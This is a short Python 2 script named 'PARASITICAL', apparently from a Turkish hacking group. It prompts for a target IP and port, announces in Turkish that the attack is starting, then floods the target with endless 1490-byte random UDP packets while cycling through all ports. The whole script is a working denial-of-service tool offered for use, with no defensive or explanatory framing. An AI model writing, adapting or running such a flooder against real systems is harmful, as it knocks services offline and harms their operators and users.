import sys
import os
import time
import socket
import random
from colorama import Fore, Back, Style
from random import choice
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
logo = """ 

 ___   _    ____      _    ____ ___ _____ ___ ____    _    _  *   
|  _ \ / \  |  _ \    / \  / ___|_ _|_   _|_ _/ ___|  / \  | | *   
| |_) / _ \ | |_) |  / _ \ \___ \| |  | |  | | |     / _ \ | |    
|  __/ ___ \|  _ <  / ___ \ ___) | |  | |  | | |___ / ___ \| |___ 
|_| /_/   \_\_| \_\/_/   \_\____/___| |_| |___\____/_/   \_\_____|v1.2

"""
print(Fore.RED + Style.BRIGHT + logo + Style.RESET_ALL + Style.BRIGHT +"\n")
print
print "yapimci  : xyxALpHA"
print "--------------------------------------------"
print "website : https://www.turkhackteam.org"
print "--------------------------------------------"
print "instagram :xyxALpHA_tht"
print "--------------------------------------------"
print "PARASITICAL"
print "------******--------------------******------"
ip = raw_input("HEDEF IP : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet SALDIRI BASLIYOR")
print "[         ---turkhackteam---           ] 0% "
time.sleep(5)
print "[==THT===               ] 25%"
time.sleep(5)
print "[====THT======          ] 50%"
time.sleep(5)
print "[=======THT========     ] 75%"
time.sleep(5)
print "[==========THT==========] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "BASARILI %s PAKET ADRESI %s HEDEF PORT:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

